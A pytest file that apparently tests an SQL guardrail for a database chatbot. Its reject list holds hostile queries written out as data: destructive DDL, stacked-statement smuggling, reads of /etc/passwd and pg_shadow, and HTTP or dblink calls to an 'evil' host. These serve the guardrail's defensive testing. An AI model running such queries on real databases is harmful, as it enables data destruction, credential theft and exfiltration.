"""Guardrail tests. Rejections need no database; accepted queries are also executed as
chatbot_ro (needs TEST_DATABASE_URL) to prove the re-generated SQL really runs."""

import os

import psycopg
import pytest
from psycopg.conninfo import conninfo_to_dict, make_conninfo

from api.chat.guard import ROW_LIMIT, GuardRejected, check_sql
from data.generate import generate
from data.load import load_all

MUST_REJECT = {
    # the M5 gate, as SQL a model might write for them
    "delete all deals": "DELETE FROM fact_deals",
    "drop fact_deals": "DROP TABLE fact_deals",
    "show me pg_user": "SELECT * FROM pg_user",
    # other writes / DDL / session changes
    "update": "UPDATE fact_deals SET amount = 0",
    "insert": "INSERT INTO anomalies (metric) VALUES ('x')",
    "truncate": "TRUNCATE fact_deals",
    "create": "CREATE TABLE junk AS SELECT 1",
    "alter": "ALTER TABLE fact_deals ADD COLUMN x int",
    "grant": "GRANT ALL ON fact_deals TO chatbot_ro",
    "set role": "SET ROLE postgres",
    "copy": "COPY fact_deals TO STDOUT",
    "select into": "SELECT * INTO junk FROM v_as_of",
    "row lock": "SELECT * FROM v_deal_facts FOR UPDATE",
    # smuggling
    "stacked statements": "SELECT 1; DROP TABLE fact_deals",
    "stacked after comment": "SELECT * FROM v_as_of; -- harmless\nDELETE FROM fact_deals",
    "data-modifying CTE": "WITH d AS (DELETE FROM fact_deals RETURNING *) SELECT * FROM d",
    "CTE shadowing a real table": "WITH fact_deals AS (SELECT * FROM fact_deals) SELECT * FROM fact_deals",
    "CTE shadowing allowed view": "WITH v_as_of AS (SELECT * FROM ground_truth) SELECT * FROM v_as_of",
    # raw tables and the answer key, directly or nested
    "raw fact table": "SELECT * FROM fact_deals",
    "raw dim table": "SELECT rep_name FROM dim_rep",
    "answer key": "SELECT * FROM ground_truth",
    "answer key in subquery": "SELECT * FROM v_as_of WHERE as_of > (SELECT min(start_date) FROM ground_truth)",
    "answer key in join": "SELECT * FROM v_deal_facts d JOIN ground_truth g ON g.rep_id = d.rep_id",
    "answer key in union": "SELECT region FROM v_deal_facts UNION SELECT region FROM ground_truth",
    "answer key in CTE": "WITH x AS (SELECT * FROM ground_truth) SELECT * FROM x",
    # system catalogs and schemas
    "pg_catalog qualified": "SELECT * FROM pg_catalog.pg_user",
    "pg_shadow": "SELECT * FROM pg_shadow",
    "information_schema": "SELECT * FROM information_schema.tables",
    "other schema": "SELECT * FROM auth.users",
    "cross-database name": "SELECT * FROM otherdb.public.v_as_of",
    # dangerous functions
    "sleep": "SELECT pg_sleep(10)",
    "sleep in where": "SELECT * FROM v_as_of WHERE pg_sleep(10) IS NOT NULL",
    "read file": "SELECT pg_read_file('/etc/passwd')",
    "list dir as table": "SELECT * FROM pg_ls_dir('.')",
    "set_config": "SELECT set_config('statement_timeout', '0', false)",
    "current_setting": "SELECT current_setting('data_directory')",
    "query_to_xml runs arbitrary SQL": "SELECT query_to_xml('select * from ground_truth', true, true, '')",
    "dblink": "SELECT * FROM dblink('host=evil', 'select 1') AS t(a int)",
    "version": "SELECT version()",
    # found by the adversarial pass (denylist era): fixed by allowlisting functions
    "user-defined function": "SELECT refresh_kpis()",
    "quoted function name": 'SELECT "pg_sleep"(10)',
    "extension schema function": "SELECT extensions.http_get('http://evil')",
    "pg_net style": "SELECT net.http_post('http://evil', '{}')",
    "unknown function": "SELECT gen_random_uuid()",
    "ROWS FROM": "SELECT * FROM ROWS FROM (pg_ls_dir('.'))",
    "LATERAL answer key": "SELECT * FROM v_as_of, LATERAL (SELECT * FROM ground_truth) g",
    "quoted upper-case table": 'SELECT * FROM "GROUND_TRUTH"',
    "TABLE shorthand": "TABLE ground_truth",
    "EXPLAIN": "EXPLAIN ANALYZE DELETE FROM fact_deals",
    "DO block": "DO $$ BEGIN DELETE FROM fact_deals; END $$",
    "CALL": "CALL refresh_kpis()",
    "INSERT via CTE": "WITH x AS (INSERT INTO anomalies DEFAULT VALUES RETURNING *) SELECT * FROM x",
    # junk
    "empty": "   ",
    "not sql": "please give me the win rate",
    "too long": "SELECT 1 " + "+ 1 " * 3000,
}

MUST_ALLOW = {
    "simple": "SELECT as_of FROM v_as_of",
    "aggregate + filter": "SELECT region, sum(won_count) AS won FROM v_monthly_region_kpis "
                          "WHERE month >= '2025-07-01' GROUP BY region ORDER BY won DESC",
    "date_trunc + case": "SELECT date_trunc('quarter', closed_date) AS q, "
                         "avg(CASE WHEN is_won THEN 1.0 ELSE 0 END) AS wr "
                         "FROM v_deal_facts WHERE closed_date IS NOT NULL GROUP BY 1 ORDER BY 1",
    "CTE": "WITH w AS (SELECT region, win_rate FROM v_monthly_region_kpis WHERE region = 'West') "
           "SELECT * FROM w",
    "window function": "SELECT rep_id, quarter, attainment, rank() OVER (PARTITION BY quarter "
                       "ORDER BY attainment) AS r FROM v_quota_attainment",
    "join two views": "SELECT q.rep_name, avg(q.attainment) FROM v_quota_attainment q "
                      "JOIN v_deal_facts d ON d.rep_id = q.rep_id GROUP BY 1 LIMIT 3",
    "union of views": "SELECT 'velocity' AS k, velocity_per_day AS v FROM mv_pipeline_velocity "
                      "WHERE region = 'All' UNION ALL SELECT 'open', open_deals FROM mv_pipeline_velocity "
                      "WHERE region = 'All'",
    "generate_series": "SELECT d::date FROM generate_series('2025-04-01'::date, '2025-04-03', "
                       "'1 day') AS d",
    "public-qualified": "SELECT * FROM public.mv_churn_risk WHERE churn_risk_score >= 60",
    "word 'deleted' in a string": "SELECT count(*) FROM v_deal_facts WHERE stage <> 'deleted'",
    "trailing semicolon": "SELECT as_of FROM v_as_of;",
    "filter + coalesce + round": "SELECT region, round(coalesce(sum(won_value) FILTER (WHERE "
                                 "quarter = '2025-07-01'), 0), 2) AS q3 FROM v_monthly_region_kpis "
                                 "GROUP BY region",
    "extract + to_char": "SELECT to_char(month, 'Mon YYYY') AS m, extract(year FROM month) AS y "
                         "FROM v_monthly_region_kpis LIMIT 5",
    "lag": "SELECT month, win_rate, lag(win_rate) OVER (ORDER BY month) AS prev "
           "FROM v_monthly_region_kpis WHERE region = 'West'",
}


@pytest.mark.parametrize("sql", MUST_REJECT.values(), ids=MUST_REJECT.keys())
def test_rejects(sql):
    with pytest.raises(GuardRejected):
        check_sql(sql)


@pytest.mark.parametrize("sql", MUST_ALLOW.values(), ids=MUST_ALLOW.keys())
def test_allows_and_wraps_in_limit(sql):
    safe = check_sql(sql)
    assert safe.startswith("SELECT * FROM (") and safe.endswith(f") AS q LIMIT {ROW_LIMIT}")


def test_comments_are_stripped_from_what_runs():
    safe = check_sql("SELECT as_of FROM v_as_of -- ; DROP TABLE fact_deals")
    assert "DROP" not in safe and "--" not in safe


def test_reason_is_user_readable():
    with pytest.raises(GuardRejected, match="ground_truth"):
        check_sql("SELECT * FROM ground_truth")


# ---------- accepted SQL must actually run as chatbot_ro ----------

TEST_DB = os.environ.get("TEST_DATABASE_URL")


@pytest.fixture(scope="module")
def chat():
    if not TEST_DB:
        pytest.skip("TEST_DATABASE_URL not set")
    with psycopg.connect(TEST_DB) as admin:
        with admin.transaction():
            load_all(admin, generate(42), chat_password="chatbot-test-only")
    url = make_conninfo(**{**conninfo_to_dict(TEST_DB), "user": "chatbot_ro",
                           "password": "chatbot-test-only"})
    with psycopg.connect(url, autocommit=True) as c:
        yield c


@pytest.mark.parametrize("sql", MUST_ALLOW.values(), ids=MUST_ALLOW.keys())
def test_allowed_sql_runs_as_chatbot(chat, sql):
    rows = chat.execute(check_sql(sql)).fetchall()
    assert len(rows) <= ROW_LIMIT


def test_limit_caps_big_results(chat):
    rows = chat.execute(check_sql("SELECT * FROM v_deal_facts")).fetchall()
    assert len(rows) == ROW_LIMIT  # 12,166 deals exist; only 500 come back


def test_legal_but_heavy_query_is_stopped_by_the_timeout_layer(chat):
    """The guard checks what a query touches, not its cost; the role's 5s timeout does that."""
    heavy = check_sql("SELECT count(*) FROM v_deal_facts a, v_deal_facts b, v_deal_facts c")
    with pytest.raises(psycopg.errors.QueryCanceled):
        chat.execute(heavy)


def test_real_time_functions_are_not_offered():
    """KPIs use the data's as_of date, never the real clock (METRICS.md)."""
    with pytest.raises(GuardRejected, match="current_timestamp"):
        check_sql("SELECT date(now())")
